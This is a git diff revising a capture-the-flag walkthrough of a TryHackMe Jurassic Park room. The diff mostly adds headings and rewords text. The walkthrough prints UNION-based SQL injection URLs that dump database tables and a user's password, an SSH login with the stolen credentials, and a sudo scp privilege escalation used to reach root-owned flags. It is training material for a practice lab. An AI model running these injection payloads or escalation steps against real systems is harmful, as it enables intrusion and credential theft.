@@ -42,7 +42,7 @@ While we wait for the box to deploy let's have a quick look at the room descript
 We have a few clues here to help us know where to start:
 
 1. There is a web application running on a port somewhere, make sure we find that with Nmap.
-2. There are 4 flags hidden around the file system, make sure we look for hidden files with *ls -lsa*
+2. There are 5 flags hidden around the file system, make sure we look for hidden files with *ls -lsa*
 3. It mentions Dennis in italics, is this a hint at a user?
 
 With the above in mind, let's start with Nmap to check for open ports:
@@ -78,6 +78,8 @@ We find a simple page with a link to a shop, let's try that:
 The shop has three packages we can buy, let's go the for best and see what gold gives us:
 
 ![jurassic-gold](/assets/images/2021-01-27-22-11-34.png)
+
+## SQL Injection
 
 We have a static webpage with nothing obvious on it. However, we see in the address bar that the site is using parameters to pull the content of each page from a database.
 
@@ -119,7 +121,7 @@ http://10.10.9.16/item.php?id=5 union select 1,group_concat(table_name),3,4,5 fr
 
 ![jurassic-tables](/assets/images/2021-01-27-22-36-45.png)
 
-We have two tables, users and items. Let's look at the users table first, and see what columns are in it:
+We have two tables, users and items. Looking at the users table, we see two columns are in it:
 
 ```text
 http://10.10.9.16/item.php?id=5 union select 1,group_concat(column_name),3,4,5 from information_schema.columns where table_schema = database() and table_name = "users"
@@ -137,9 +139,11 @@ http://10.10.9.16/item.php?id=5 union select 1,password,3,4,5 from users
 
 So we have the password, but where do we use it? And what could the associated username be?
 
-From the Nmap scan we know there is ssh on port 22. From the developer on ?id=5 we found a possible user dennis. And from the user table we found a password.
+## Gaining Access
 
-So let's try it and see what we find:
+From the Nmap scan we know there is ssh on port 22. From the developer on ?id=5 we found a possible user Dennis. And from the user table we found a password.
+
+Let's use the credentials we've discovered and try to ssh in as dennis:
 
 ```text
 kali@kali:~$ ssh dennis@10.10.9.16
@@ -158,7 +162,7 @@ Welcome to Ubuntu 16.04.5 LTS (GNU/Linux 4.4.0-1072-aws x86_64)
 dennis@ip-10-10-9-16:~$ 
 ```
 
-Success! We have been able to log in to ssh as dennis.
+Excellent, we are able to log in as dennis.
 
 First let's look in our current directory. Using ls with the -a parameter shows all files, including hidden ones:
 
@@ -177,12 +181,14 @@ dennis@ip-10-10-9-16:~$ ls -lsa
 8 -rw------- 1 dennis dennis 4350 Feb 16  2019 .viminfo
 ```
 
+## Flag 1
+
 We've found flag 1, let's cat it and register on the thm site:
 
 ```text
 dennis@ip-10-10-9-16:~$ cat flag1.txt
 Congrats on finding the first flag.. But what about the rest? :O
-(HIDDEN)
+<<HIDDEN>>
 ```
 
 There's also a file called test.sh, let's look at that:
@@ -195,11 +201,13 @@ cat /root/flag5.txt
 
 We have the location of flag 5, but can't get to that until we are root.
 
+## Flag 3
+
 Let's keep looking, another file worth checking is bash_history in case it hasn't been cleared:
 
 ```text
 dennis@ip-10-10-9-16:~$ cat .bash_history 
-Flag3:(HIDDEN))
+Flag3:<<HIDDEN>>
 sudo -l
 sudo scp
 scp
@@ -240,7 +248,9 @@ vim ~/.bash_history
 
 Excellent, in there we find flag 3, plus scp has been used a lot, mostly with sudo to copy the flag5.txt file to another host.
 
-This seems suspicious, let's have a look what sudo permissions dennis has:
+## Flag 5
+
+The use of scp seems suspicious, let's have a look what sudo permissions dennis has:
 
 ```text
 dennis@ip-10-10-9-16:~$ sudo -l
@@ -269,8 +279,10 @@ Let's check out the flag:
 
 ```text
 kali@kali:~$ cat flag5.txt
-(HIDDEN)
+<<HIDDEN>>
 ```
+
+## Flag 2
 
 After submitting that flag on the thm site, we need to look for the last one, flag 2.
 
@@ -345,7 +357,7 @@ It's owned by root but world readable. So no need to scp it across, we can just 
 
 ```text
 dennis@ip-10-10-9-16:/home/ubuntu$ cat /boot/grub/fonts/flagTwo.txt
-(HIDDEN)
+<<HIDDEN>>
 ```
 
 That was our last flag, for some reason there is no flag 4!
